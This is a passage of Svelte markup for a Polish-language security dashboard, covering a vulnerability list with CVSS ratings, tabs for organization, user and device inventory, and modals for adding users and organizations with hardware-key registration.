                <button class="btn-primary" style="background: rgba(239, 68, 68, 0.1); border: 1px solid #ef4444; color: #ef4444; padding: 8px 16px; font-size: 13px;" on:click={handleLockVulnerabilities}>
                  Zablokuj Dane
                </button>
              {:else}
                <button class="btn-primary" style="background: rgba(16, 185, 129, 0.1); border: 1px solid #10b981; color: #10b981; padding: 8px 16px; font-size: 13px;" on:click={handleDecryptVulnerabilities} disabled={decryptingVulnerabilities}>
                  {#if decryptingVulnerabilities}
                    Odszyfrowywanie...
                  {:else}
                    Odszyfruj Foką (Sui Seal)
                  {/if}
                </button>
              {/if}
            </div>
          </div>

          {#if !isVulnerabilitiesDecrypted}
            <!-- Encrypted state -->
            <div style="display: flex; flex-direction: column; gap: 12px;">
              {#each encryptedVulnerabilities as vuln}
                <div style="background: rgba(255, 255, 255, 0.01); border: 1px solid rgba(255, 255, 255, 0.04); border-radius: 8px; padding: 16px; display: flex; justify-content: space-between; align-items: center;">
                  <div>
                    <span style="font-family: monospace; font-size: 12px; color: #64748b;">ID: {vuln.id} • Agent: {vuln.agent}</span>
                    <div style="font-family: monospace; font-size: 11px; color: #475569; margin-top: 4px; max-width: 450px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">
                      Payload: {vuln.encrypted_payload}
                    </div>
                  </div>
                  <div style="display: flex; align-items: center; gap: 12px;">
                    <span style="font-size: 12px; color: #94a3b8; background: rgba(255,255,255,0.05); padding: 4px 8px; border-radius: 4px;">CVSS: {vuln.cvss}</span>
                    <span style="color: #ef4444; font-size: 14px;">🔒 Zaszyfrowane</span>
                  </div>
                </div>
              {/each}
            </div>
          {:else}
            <!-- Decrypted state -->
            <div style="display: flex; flex-direction: column; gap: 16px;">
              {#each decryptedVulnerabilities as vuln}
                <div style="background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 12px; padding: 20px; display: flex; flex-direction: column; gap: 12px; border-left: 4px solid {vuln.cvss >= 9.0 ? '#ef4444' : vuln.cvss >= 7.0 ? '#f97316' : '#f59e0b'};">
                  <div style="display: flex; justify-content: space-between; align-items: center;">
                    <div style="display: flex; align-items: center; gap: 8px;">
                      <span style="font-size: 11px; background: rgba(56, 189, 248, 0.15); color: #38bdf8; padding: 2px 6px; border-radius: 4px; font-weight: 700; font-family: monospace;">{vuln.id}</span>
                      <strong style="font-size: 15px; color: #f1f5f9;">{vuln.package}</strong>
                      <span style="font-size: 11px; background: rgba(255,255,255,0.08); color: #94a3b8; padding: 2px 6px; border-radius: 4px;">{vuln.manager}</span>
                    </div>
                    <span style="font-size: 13px; font-weight: 800; color: {vuln.cvss >= 9.0 ? '#ef4444' : vuln.cvss >= 7.0 ? '#f97316' : '#f59e0b'};">
                      CVSS: {vuln.cvss} ({vuln.cvss >= 9.0 ? 'Krytyczny' : vuln.cvss >= 7.0 ? 'Wysoki' : 'Średni'})
                    </span>
                  </div>
                  <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; font-size: 13px; color: #94a3b8; background: rgba(0,0,0,0.15); padding: 12px; border-radius: 6px;">
                    <div><strong>CVE:</strong> <code style="color: #38bdf8;">{vuln.cve}</code></div>
                    <div><strong>Wersja:</strong> <code style="color: #e2e8f0;">{vuln.installed}</code></div>
                    <div><strong>Aktualizacja:</strong> <code style="color: #10b981;">{vuln.fixed}</code></div>
                  </div>
                  <div style="font-size: 13px; color: #cbd5e1; line-height: 1.4;">
                    <strong>Konsekwencje:</strong> {vuln.consequence}
                  </div>
                </div>
              {/each}
            </div>
          {/if}
        </div>
      </div>
    {/if}

    <!-- Helium Tab -->
    {#if activeTab === "helium"}
      <div class="vm-tab-panel">
        <div class="panel glass-panel" style="width: 100%; box-sizing: border-box; display: flex; flex-direction: column; gap: 24px;">
          
          <!-- Org Header Card -->
          <div style="background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 12px; padding: 20px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 16px;">
            <div style="display: flex; align-items: center; gap: 14px;">
              <span style="font-size: 32px; filter: drop-shadow(0 0 10px rgba(139, 92, 246, 0.4));">🏢</span>
              <div>
                <div style="display: flex; align-items: center; gap: 10px;">
                  <select 
                    bind:value={selectedOrgIndex} 
                    style="background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.08); border-radius: 6px; color: white; padding: 6px 12px; font-size: 14px; font-weight: 700;"
                  >
                    {#each heliumOrganizations as org, i}
                      <option value={i}>{org.name} ({org.orgCode})</option>
                    {/each}
                  </select>
                  <span style="font-size: 10px; background: rgba(56, 189, 248, 0.15); color: #38bdf8; padding: 2px 6px; border-radius: 4px; font-weight: 600;">
                    {heliumOrganizations[selectedOrgIndex].legalForm}
                  </span>
                </div>
                <p style="margin: 6px 0 0 0; font-size: 11px; color: #94a3b8; font-family: monospace;">
                  Sui ID: {heliumOrganizations[selectedOrgIndex].id}
                </p>
              </div>
            </div>
            
            <div style="display: flex; gap: 12px; align-items: center;">
              <button 
                style="background: rgba(16, 185, 129, 0.1); border: 1px solid rgba(16, 185, 129, 0.25); color: #10b981; padding: 8px 14px; font-size: 12px; font-weight: 600; border-radius: 8px; cursor: pointer;"
                on:click={() => (showAddOrgModal = true)}
              >
                ➕ Nowa Organizacja
              </button>
            </div>
            
            <div style="display: flex; gap: 16px; align-items: center;">
              <!-- Policy badge -->
              <div style="background: rgba(56, 189, 248, 0.08); border: 1px solid rgba(56, 189, 248, 0.2); border-radius: 8px; padding: 10px 14px; display: flex; flex-direction: column; gap: 4px;">
                <span style="font-size: 10px; color: #64748b; font-weight: 700; text-transform: uppercase;">Przypisana Polityka Polonium</span>
                <span style="font-size: 12px; color: #38bdf8; font-weight: 600; display: flex; align-items: center; gap: 6px;">
                  🛡️ {selectedComplianceTemplate.toUpperCase()} (Ważna)
                </span>
              </div>
              <button 
                class="btn-primary" 
                style="background: linear-gradient(135deg, #8b5cf6 0%, #6d28d9 100%); border: none; padding: 10px 16px; font-size: 12px; font-weight: 600; border-radius: 8px;"
                on:click={() => (activeTab = "polonium")}
              >
                ⚙️ Zarządzaj
              </button>
            </div>
          </div>
 
          <!-- Org Metadata & Keys Section -->
          <div style="background: rgba(15, 23, 42, 0.4); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 12px; padding: 16px; display: flex; flex-direction: column; gap: 12px;">
            <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(255, 255, 255, 0.05); padding-bottom: 8px;">
              <span style="font-size: 13px; font-weight: 600; color: #cbd5e1; display: flex; align-items: center; gap: 6px;">
                🔑 Szczegóły zabezpieczeń i Uwierzytelnienie sprzętowe
              </span>
              <span style="font-size: 11px; font-weight: 600; padding: 3px 8px; border-radius: 6px; background: {heliumOrganizations[selectedOrgIndex].requireHardware ? 'rgba(16, 185, 129, 0.15)' : 'rgba(100, 116, 139, 0.15)'}; color: {heliumOrganizations[selectedOrgIndex].requireHardware ? '#10b981' : '#94a3b8'};">
                {heliumOrganizations[selectedOrgIndex].requireHardware ? '🔒 Włączone (HID / Ledger)' : '🔓 Wyłączone'}
              </span>
            </div>
            
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 16px;">
              <div>
                <p style="margin: 0 0 4px 0; font-size: 11px; color: #64748b; font-weight: 600; text-transform: uppercase;">Dane podatkowo-rejestrowe</p>
                <div style="font-size: 12px; color: #cbd5e1; display: flex; flex-direction: column; gap: 4px;">
                  <div>Region: <strong>{heliumOrganizations[selectedOrgIndex].region || 'PL'}</strong></div>
                  <div>Identyfikator podatkowy: <strong>{heliumOrganizations[selectedOrgIndex].taxId || 'Nie podano'}</strong></div>
                </div>
              </div>
              <div>
                <p style="margin: 0 0 6px 0; font-size: 11px; color: #64748b; font-weight: 600; text-transform: uppercase;">Master Keys (Klucze Główne)</p>
                {#if heliumOrganizations[selectedOrgIndex].masterKeys && heliumOrganizations[selectedOrgIndex].masterKeys.length > 0}
                  <div style="display: flex; flex-direction: column; gap: 4px;">
                    {#each heliumOrganizations[selectedOrgIndex].masterKeys as key, idx}
                      <div style="font-size: 11px; font-family: monospace; background: rgba(0,0,0,0.25); border: 1px solid rgba(255,255,255,0.04); padding: 4px 8px; border-radius: 4px; color: #38bdf8; text-overflow: ellipsis; overflow: hidden; white-space: nowrap;">
                        Key #{idx + 1}: {key}
                      </div>
                    {/each}
                  </div>
                {:else}
                  <span style="font-size: 12px; color: #64748b; font-style: italic;">Brak skonfigurowanych kluczy głównych (Wymagana autoryzacja standardowa)</span>
                {/if}
              </div>
            </div>
          </div>
 
          <!-- Main Columns Grid -->
          <div style="display: grid; grid-template-columns: 1fr 1.3fr; gap: 24px; min-height: 450px;">
            
            <!-- Left Side: Hydrogen Users -->
            <div style="background: rgba(255, 255, 255, 0.01); border: 1px solid rgba(255, 255, 255, 0.04); border-radius: 12px; padding: 20px; display: flex; flex-direction: column; gap: 16px;">
              <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(255, 255, 255, 0.05); padding-bottom: 12px;">
                <h4 style="margin: 0; font-size: 14px; font-weight: 600; color: #cbd5e1; display: flex; align-items: center; gap: 6px;">
                  👤 Użytkownicy (Hydrogen User Assets)
                </h4>
                <button 
                  style="background: rgba(56, 189, 248, 0.1); border: 1px solid rgba(56, 189, 248, 0.2); color: #38bdf8; padding: 4px 10px; border-radius: 6px; font-size: 11px; font-weight: 600; cursor: pointer;"
                  on:click={() => (showAddUserModal = true)}
                >
                  ➕ Dodaj
                </button>
              </div>

              <div style="display: flex; flex-direction: column; gap: 10px; overflow-y: auto; max-height: 380px;">
                {#each hydrogenUsers as user}
                  <div style="background: rgba(0, 0, 0, 0.2); border: 1px solid rgba(255, 255, 255, 0.03); border-radius: 8px; padding: 12px; display: flex; justify-content: space-between; align-items: center;">
                    <div style="display: flex; flex-direction: column; gap: 4px; max-width: 70%;">
                      <div style="display: flex; align-items: center; gap: 8px;">
                        <span style="font-weight: 600; color: #f1f5f9; font-size: 13px;">{user.username}</span>
                        <span style="font-size: 9px; background: rgba(139, 92, 246, 0.15); color: #c084fc; padding: 1px 5px; border-radius: 4px;">{user.role}</span>
                      </div>
                      <span style="font-size: 11px; color: #64748b;">{user.email}</span>
                      <span style="font-size: 9px; color: #64748b; font-family: monospace; text-overflow: ellipsis; overflow: hidden; white-space: nowrap;">Key: {user.key}</span>
                    </div>

                    <div style="display: flex; flex-direction: column; align-items: flex-end; gap: 8px;">
                      <span style="font-size: 10px; padding: 2px 6px; border-radius: 4px; font-weight: 600; background: {user.status === 'Active' ? 'rgba(16, 185, 129, 0.15)' : 'rgba(239, 68, 68, 0.15)'}; color: {user.status === 'Active' ? '#10b981' : '#f87171'};">
                        {user.status}
                      </span>
                      <button 
                        style="background: transparent; border: none; color: #94a3b8; font-size: 10px; cursor: pointer; text-decoration: underline;"
                        on:click={() => {
                          user.status = user.status === 'Active' ? 'Suspended' : 'Active';
                          hydrogenUsers = [...hydrogenUsers];
                        }}
                      >
                        Przełącz stan
                      </button>
                    </div>
                  </div>
                {/each}
              </div>
            </div>

            <!-- Right Side: Hydrogen Devices -->
            <div style="background: rgba(255, 255, 255, 0.01); border: 1px solid rgba(255, 255, 255, 0.04); border-radius: 12px; padding: 20px; display: flex; flex-direction: column; gap: 16px;">
              <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(255, 255, 255, 0.05); padding-bottom: 12px;">
                <h4 style="margin: 0; font-size: 14px; font-weight: 600; color: #cbd5e1; display: flex; align-items: center; gap: 6px;">
                  🖥️ Maszyny i IoT (Hydrogen Device Assets)
                </h4>
                <button 
                  style="background: rgba(56, 189, 248, 0.1); border: 1px solid rgba(56, 189, 248, 0.2); color: #38bdf8; padding: 4px 10px; border-radius: 6px; font-size: 11px; font-weight: 600; cursor: pointer;"
                  on:click={() => (showAddDeviceModal = true)}
                >
                  ➕ Dodaj
                </button>
              </div>

              <div style="display: flex; flex-direction: column; gap: 10px; overflow-y: auto; max-height: 380px;">
                {#each hydrogenDevices as device}
                  <div style="background: rgba(0, 0, 0, 0.2); border: 1px solid rgba(255, 255, 255, 0.03); border-radius: 8px; padding: 12px; display: flex; justify-content: space-between; align-items: center;">
                    <div style="display: flex; flex-direction: column; gap: 4px; max-width: 65%;">
                      <div style="display: flex; align-items: center; gap: 8px; flex-wrap: wrap;">
                        <span style="font-weight: 600; color: #f1f5f9; font-size: 13px;">{device.deviceId}</span>
                        <span style="font-size: 9px; background: rgba(255,255,255,0.08); color: #cbd5e1; padding: 1px 5px; border-radius: 4px;">{device.type}</span>
                        <span style="font-size: 9px; color: #64748b;">{device.os}</span>
                      </div>
                      <div style="font-size: 11px; color: #94a3b8;">
                        IP: {device.ip.join(', ')} | MAC: {device.mac}
                      </div>
                      <div style="font-size: 11px; color: #64748b; display: flex; align-items: center; gap: 4px;">
                        <span>Przypisany user:</span>
                        <strong style="color: #38bdf8;">{device.associatedUser}</strong>
                      </div>
                    </div>

                    <div style="display: flex; flex-direction: column; align-items: flex-end; gap: 8px;">
                      <span style="font-size: 10px; padding: 2px 6px; border-radius: 4px; font-weight: 600; background: {device.status === 'Safe' ? 'rgba(16, 185, 129, 0.15)' : device.status === 'Suspicious' ? 'rgba(245, 158, 11, 0.15)' : 'rgba(239, 68, 68, 0.15)'}; color: {device.status === 'Safe' ? '#10b981' : device.status === 'Suspicious' ? '#f59e0b' : '#f87171'};">
                        {device.status}
                      </span>
                      <div style="display: flex; gap: 4px;">
                        <button 
                          style="background: rgba(239, 68, 68, 0.1); border: 1px solid rgba(239, 68, 68, 0.2); color: #f87171; font-size: 9px; padding: 2px 6px; border-radius: 4px; cursor: pointer;"
                          on:click={() => changeDeviceStatus(device.id, 'Isolated')}
                        >
                          Izoluj
                        </button>
                        <button 
                          style="background: rgba(16, 185, 129, 0.1); border: 1px solid rgba(16, 185, 129, 0.2); color: #10b981; font-size: 9px; padding: 2px 6px; border-radius: 4px; cursor: pointer;"
                          on:click={() => changeDeviceStatus(device.id, 'Safe')}
                        >
                          Zezwól
                        </button>
                      </div>
                    </div>
                  </div>
                {/each}
              </div>
            </div>

          </div>
        </div>
      </div>
    {/if}

    <!-- Add User Modal -->
    {#if showAddUserModal}
      <div style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,0,0.65); backdrop-filter: blur(4px); display: flex; align-items: center; justify-content: center; z-index: 1100;">
        <div class="modal-content glass-panel" style="max-width: 450px; width: 90%; padding: 24px; border: 1px solid rgba(255,255,255,0.08); border-radius: 16px; background: rgba(15, 23, 42, 0.96); display: flex; flex-direction: column; gap: 16px;">
          <h3 style="margin: 0; font-size: 16px; font-weight: 700; color: #f1f5f9;">➕ Dodaj Użytkownika (Hydrogen User)</h3>
          
          <div style="display: flex; flex-direction: column; gap: 12px;">
            <div style="display: flex; flex-direction: column; gap: 4px;">
              <label for="new_username" style="font-size: 11px; color: #94a3b8;">Nazwa użytkownika:</label>
              <input id="new_username" type="text" bind:value={newUserName} placeholder="np. j.nowak" style="background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; color: white; padding: 8px; font-size: 13px;" />
            </div>
            
            <div style="display: flex; flex-direction: column; gap: 4px;">
              <label for="new_useremail" style="font-size: 11px; color: #94a3b8;">Adres e-mail:</label>
              <input id="new_useremail" type="email" bind:value={newUserEmail} placeholder="np. jan.nowak@talus.corp" style="background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; color: white; padding: 8px; font-size: 13px;" />
            </div>

            <div style="display: flex; flex-direction: column; gap: 4px;">
              <label for="new_userrole" style="font-size: 11px; color: #94a3b8;">Rola systemowa:</label>
              <select id="new_userrole" bind:value={newUserRole} style="background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; color: white; padding: 8px; font-size: 13px;">
                <option value="Guest">Guest</option>
                <option value="Operator">Operator</option>
                <option value="SecurityAdmin">SecurityAdmin</option>
                <option value="SuperAdmin">SuperAdmin</option>
              </select>
            </div>
            
            <div style="display: flex; flex-direction: column; gap: 4px;">
              <label for="new_userkey" style="font-size: 11px; color: #94a3b8;">Klucz publiczny (opcjonalny):</label>
              <div style="display: flex; gap: 8px;">
                <input id="new_userkey" type="text" bind:value={newUserKey} placeholder="Zostaw puste dla generacji losowej lub sparuj" style="flex: 1; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; color: white; padding: 8px; font-size: 13px; font-family: monospace;" />
                <button type="button" on:click={() => registerHardwareKey('yubikey', 'user')} style="background: rgba(139, 92, 246, 0.15); border: 1px solid rgba(139, 92, 246, 0.3); color: #c084fc; padding: 6px 12px; border-radius: 8px; font-size: 11px; font-weight: 600; cursor: pointer; white-space: nowrap;">
                  🔑 YubiKey
                </button>
                <button type="button" on:click={() => registerHardwareKey('seckey', 'user')} style="background: rgba(16, 185, 129, 0.15); border: 1px solid rgba(16, 185, 129, 0.3); color: #34d399; padding: 6px 12px; border-radius: 8px; font-size: 11px; font-weight: 600; cursor: pointer; white-space: nowrap;">
                  🛡️ Sec Key
                </button>
              </div>
              {#if newUserKey && newUserKey.trim().length > 0}
                <div style="margin-top: 2px;">
                  <span style="font-size: 10px; color: #60a5fa; background: rgba(96, 165, 250, 0.08); border: 1px solid rgba(96, 165, 250, 0.15); padding: 2px 6px; border-radius: 4px; font-family: monospace; display: inline-block;">
                    🔑 Fingerprint: {newUserKey.startsWith('0x3059301306072a8648ce3d020106082a8648ce3d03010703420004') ? '0x...' + newUserKey.substring(56, 64) + '...' + newUserKey.substring(newUserKey.length - 8) : (newUserKey.length > 20 ? newUserKey.substring(0, 10) + '...' + newUserKey.substring(newUserKey.length - 8) : newUserKey)}
                  </span>
                </div>
              {/if}
            </div>
          </div>

          <div style="display: flex; gap: 10px; justify-content: flex-end; margin-top: 10px;">
            <button style="background: transparent; border: 1px solid rgba(255,255,255,0.1); color: #cbd5e1; padding: 8px 14px; border-radius: 8px; font-size: 12px; cursor: pointer;" on:click={() => showAddUserModal = false}>Anuluj</button>
            <button class="btn-primary" style="padding: 8px 14px; font-size: 12px;" on:click={handleAddUser}>Zapisz</button>
          </div>
        </div>
      </div>
    {/if}

    <!-- Add Organization Modal -->
    {#if showAddOrgModal}
      <div style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,0,0.65); backdrop-filter: blur(4px); display: flex; align-items: center; justify-content: center; z-index: 1100;">
        <div class="modal-content glass-panel" style="max-width: 480px; width: 92%; padding: 24px; border: 1px solid rgba(255,255,255,0.08); border-radius: 16px; background: rgba(15, 23, 42, 0.97); display: flex; flex-direction: column; gap: 16px; max-height: 90vh; overflow-y: auto;">
          <h3 style="margin: 0; font-size: 16px; font-weight: 700; color: #f1f5f9;">🏢 Utwórz Nową Organizację (Helium Tenant)</h3>

          <!-- Step 1: Region -->
          <div style="display: flex; flex-direction: column; gap: 10px;">
            <p style="margin: 0; font-size: 11px; font-weight: 600; color: #94a3b8; text-transform: uppercase; letter-spacing: 0.08em;">1. Wybierz region / kraj rejestracji:</p>
            <select bind:value={newOrgRegion} style="background: rgba(0,0,0,0.35); border: 1px solid rgba(255,255,255,0.1); border-radius: 8px; color: white; padding: 10px 12px; font-size: 13px; appearance: none; -webkit-appearance: none; cursor: pointer;">
              {#each euRegions as region}
                <option value={region.code}>{region.flag} {region.name}</option>
              {/each}
            </select>
            <select bind:value={newOrgLegalForm} style="background: rgba(0,0,0,0.35); border: 1px solid rgba(255,255,255,0.1); border-radius: 8px; color: white; padding: 10px 12px; font-size: 13px; cursor: pointer;">
              {#each availableLegalForms as form}
                <option value={form}>{form}</option>
              {/each}
            </select>
          </div>

          <!-- Step 2: Tax / Registry IDs -->
          <div style="display: flex; flex-direction: column; gap: 10px;">
            <p style="margin: 0; font-size: 11px; font-weight: 600; color: #94a3b8; text-transform: uppercase; letter-spacing: 0.08em;">2. Podaj dane rejestrowe dla weryfikacji:</p>
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
              <div style="display: flex; flex-direction: column; gap: 4px;">
                <label style="font-size: 11px; color: #64748b;">{selectedRegion.taxId} {newOrgRegion === 'PL' ? '(10 cyfr)' : ''}:</label>
                <input type="text" bind:value={newOrgTaxId} on:input={(e) => detectRegionFromVat(e.target.value)} placeholder="np. 7123501789" style="background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); border-radius: 8px; color: white; padding: 9px 10px; font-size: 13px; font-family: monospace;" />
              </div>
              <div style="display: flex; flex-direction: column; gap: 4px;">
                <label style="font-size: 11px; color: #64748b;">Numer {selectedRegion.regId} {newOrgRegion === 'PL' ? '(10 cyfr)' : ''}:</label>
                <input type="text" bind:value={newOrgRegId} placeholder="np. 0001199416" style="background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); border-radius: 8px; color: white; padding: 9px 10px; font-size: 13px; font-family: monospace;" />
              </div>
            </div>
            <button on:click={handleVerifyKRS} style="width: 100%; background: linear-gradient(135deg, #2563eb, #1d4ed8); border: none; border-radius: 8px; color: white; padding: 11px; font-size: 13px; font-weight: 600; cursor: pointer; transition: opacity 0.2s;" disabled={krsVerifyState === 'loading'}>
              {#if krsVerifyState === 'loading'}
                ⏳ Weryfikowanie...
              {:else}
                🔍 Weryfikuj w {selectedRegion.regId}
              {/if}
            </button>

            <!-- KRS Result -->
            {#if krsVerifyState && krsVerifyState !== 'loading'}
              <div style="background: rgba(16, 185, 129, 0.08); border: 1px solid rgba(16, 185, 129, 0.25); border-radius: 10px; padding: 12px; display: flex; flex-direction: column; gap: 6px;">
                <div style="display: flex; align-items: center; gap: 8px;">
                  <span style="font-size: 13px; font-weight: 700; color: #10b981;">✅ Zweryfikowano pomyślnie</span>
                  <span style="background: rgba(16,185,129,0.15); color: #34d399; border-radius: 4px; padding: 2px 6px; font-size: 10px; font-weight: 600;">{selectedRegion.regId} ({selectedRegion.regId === 'KRS' ? 'Krajowy Rejestr Sądowy' : selectedRegion.regId})</span>
                </div>
                <p style="margin: 0; font-size: 12px; color: #e2e8f0;"><strong>Firma:</strong> {krsVerifyState.name}</p>
                <p style="margin: 0; font-size: 12px; color: #94a3b8;"><strong>Adres rejestrowy:</strong> {krsVerifyState.address}</p>
                <p style="margin: 0; font-size: 12px;"><strong>Status działalności:</strong> <span style="color: #10b981;">{krsVerifyState.status}</span></p>
                <p style="margin: 0; font-size: 11px; color: #64748b;">Data rejestracji: {krsVerifyState.date}</p>
              </div>
            {/if}
          </div>

          <!-- Step 3: Org details -->
          <div style="display: flex; flex-direction: column; gap: 8px;">
            <div style="display: flex; flex-direction: column; gap: 4px;">
              <label style="font-size: 11px; color: #94a3b8;">Nazwa podmiotu w systemie:</label>
              <input type="text" bind:value={newOrgName} placeholder="np. ACME Spółka z o.o." style="background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); border-radius: 8px; color: white; padding: 9px 10px; font-size: 13px;" />
            </div>
            <div style="display: flex; flex-direction: column; gap: 4px;">
              <label style="font-size: 11px; color: #94a3b8;">Skrót organizacyjny:</label>
              <input type="text" bind:value={newOrgCode} placeholder="np. ACME" style="background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); border-radius: 8px; color: white; padding: 9px 10px; font-size: 13px;" />
            </div>
          </div>

          <!-- Hardware auth -->
          <label style="display: flex; align-items: center; gap: 10px; cursor: pointer; font-size: 13px; color: #cbd5e1;">
            <input type="checkbox" bind:checked={newOrgRequireHardware} style="width: 16px; height: 16px; accent-color: #3b82f6;" />
            Wymagaj uwierzytelnienia sprzętowego (HID / Ledger)
          </label>

          {#if newOrgRequireHardware}
            <div style="background: rgba(59, 130, 246, 0.05); border: 1px solid rgba(59, 130, 246, 0.2); border-radius: 10px; padding: 14px; display: flex; flex-direction: column; gap: 10px;">
              <div style="display: flex; justify-content: space-between; align-items: center;">
                <span style="font-size: 11px; font-weight: 700; color: #60a5fa; text-transform: uppercase;">Klucze Główne (Master Keys - min. 2):</span>
                <button type="button" on:click={() => { newOrgMasterKeys = [...newOrgMasterKeys, ""]; newOrgCredentialIds = [...newOrgCredentialIds, ""]; }} style="background: rgba(96, 165, 250, 0.1); border: 1px solid rgba(96, 165, 250, 0.25); color: #60a5fa; padding: 3px 8px; border-radius: 4px; font-size: 10px; font-weight: 600; cursor: pointer;">
                  ➕ Dodaj klucz
                </button>
              </div>
              
              <div style="display: flex; flex-direction: column; gap: 8px; max-height: 150px; overflow-y: auto; padding-right: 4px;">
                {#each newOrgMasterKeys as key, i}
                  <div style="display: flex; flex-direction: column; gap: 4px; margin-bottom: 8px;">
                    <div style="display: flex; gap: 8px; align-items: center;">
                      <span style="font-size: 11px; color: #94a3b8; font-family: monospace; width: 25px;">#{i + 1}:</span>
                      <input type="text" value={key} on:input={(e) => { newOrgMasterKeys = newOrgMasterKeys.map((k, idx) => idx === i ? e.target.value : k); }} placeholder="Klucz lub sparuj urządzenie" style="flex: 1; background: rgba(0,0,0,0.35); border: 1px solid rgba(255,255,255,0.08); border-radius: 6px; color: white; padding: 6px 8px; font-size: 12px; font-family: monospace;" />
                      
                      <button type="button" on:click={() => registerHardwareKey('yubikey', 'org', i)} style="background: rgba(139, 92, 246, 0.15); border: 1px solid rgba(139, 92, 246, 0.25); color: #c084fc; padding: 4px 8px; border-radius: 6px; font-size: 10px; font-weight: 600; cursor: pointer;" title="Sparuj YubiKey">
                        🔑 Yubi
                      </button>
                      <button type="button" on:click={() => registerHardwareKey('seckey', 'org', i)} style="background: rgba(16, 185, 129, 0.15); border: 1px solid rgba(16, 185, 129, 0.25); color: #34d399; padding: 4px 8px; border-radius: 6px; font-size: 10px; font-weight: 600; cursor: pointer;" title="Sparuj Security Key">
                        🛡️ Sec
                      </button>
                      
                      {#if newOrgMasterKeys.length > 2}
                        <button type="button" on:click={() => { newOrgMasterKeys = newOrgMasterKeys.filter((_, idx) => idx !== i); newOrgCredentialIds = newOrgCredentialIds.filter((_, idx) => idx !== i); }} style="background: transparent; border: none; color: #f87171; cursor: pointer; padding: 4px; font-size: 12px;" title="Usuń">❌</button>
                      {/if}
                    </div>
                    {#if key && key.trim().length > 0}
                      <div style="padding-left: 33px;">
                        <span style="font-size: 10px; color: #60a5fa; background: rgba(96, 165, 250, 0.08); border: 1px solid rgba(96, 165, 250, 0.15); padding: 2px 6px; border-radius: 4px; font-family: monospace; display: inline-block;">
                          🔑 Fingerprint: {key.startsWith('0x3059301306072a8648ce3d020106082a8648ce3d03010703420004') ? '0x...' + key.substring(56, 64) + '...' + key.substring(key.length - 8) : (key.length > 20 ? key.substring(0, 10) + '...' + key.substring(key.length - 8) : key)}
                        </span>
                      </div>
                    {/if}
                  </div>
                {/each}
              </div>
              <div style="background: rgba(59, 130, 246, 0.08); border: 1px solid rgba(59, 130, 246, 0.2); border-radius: 8px; padding: 10px 12px; margin-top: 6px; display: flex; gap: 8px; align-items: flex-start;">
                <span style="font-size: 14px; margin-top: -1px;">💡</span>
                <p style="margin: 0; font-size: 11px; color: #93c5fd; line-height: 1.4; font-weight: 500;">
                  <strong>Wskazówka bezpieczeństwa:</strong> Musisz zarejestrować <strong>dwa różne klucze fizyczne</strong>. Dotknięcie tego samego klucza dwukrotnie zostanie automatycznie zablokowane przez przeglądarkę, aby wymusić pełną ochronę Multi-Signature.
                </p>
              </div>
              {#if newOrgHardwareError}
                <div style="background: rgba(239, 68, 68, 0.1); border: 1px solid rgba(239, 68, 68, 0.35); border-radius: 8px; padding: 12px; display: flex; flex-direction: column; gap: 6px; margin-top: 6px;">
                  <div style="display: flex; align-items: center; gap: 8px;">
                    <span style="font-size: 14px;">⚠️</span>
                    <strong style="color: #f87171; font-size: 12px;">Błąd uwierzytelnienia sprzętowego</strong>
                  </div>
                  <p style="margin: 0; font-size: 11px; color: #cbd5e1; line-height: 1.4;">
                    {newOrgHardwareError}
                  </p>
                </div>
              {/if}

              {#if newOrgRequireHardware && (newOrgMasterKeys.filter(k => k.trim().length > 0).length > new Set(newOrgMasterKeys.filter(k => k.trim().length > 0).map(k => k.trim().toLowerCase())).size)}
                <div style="background: rgba(239, 68, 68, 0.1); border: 1px solid rgba(239, 68, 68, 0.35); border-radius: 8px; padding: 12px; display: flex; flex-direction: column; gap: 6px; margin-top: 6px;">
                  <div style="display: flex; align-items: center; gap: 8px;">
                    <span style="font-size: 14px;">⚠️</span>
                    <strong style="color: #f87171; font-size: 12px;">Wykryto zduplikowane klucze sprzętowe</strong>
                  </div>
                  <p style="margin: 0; font-size: 11px; color: #cbd5e1; line-height: 1.4;">
                    Identyfikator (rawId / public key) dla przynajmniej dwóch kluczy jest taki sam. Musisz użyć <strong>dwóch różnych kluczy fizycznych</strong> (np. klucza podstawowego i zapasowego). Użycie jednego klucza dla obu pól nie spełnia polityki Multi-Signature.
                  </p>
                </div>
              {/if}
            </div>
          {/if}

          <!-- Actions -->
          <div style="display: flex; gap: 10px; justify-content: flex-end; margin-top: 4px; padding-top: 12px; border-top: 1px solid rgba(255,255,255,0.06);">
            <button style="background: transparent; border: 1px solid rgba(255,255,255,0.1); color: #cbd5e1; padding: 9px 16px; border-radius: 8px; font-size: 12px; cursor: pointer;" on:click={() => { showAddOrgModal = false; krsVerifyState = null; }}>Anuluj</button>
            <button class="btn-primary" style="padding: 9px 20px; font-size: 13px; font-weight: 600;" on:click={handleCreateOrg}>Utwórz</button>
          </div>
        </div>
      </div>
    {/if}

    <!-- Add Device Modal -->
    {#if showAddDeviceModal}
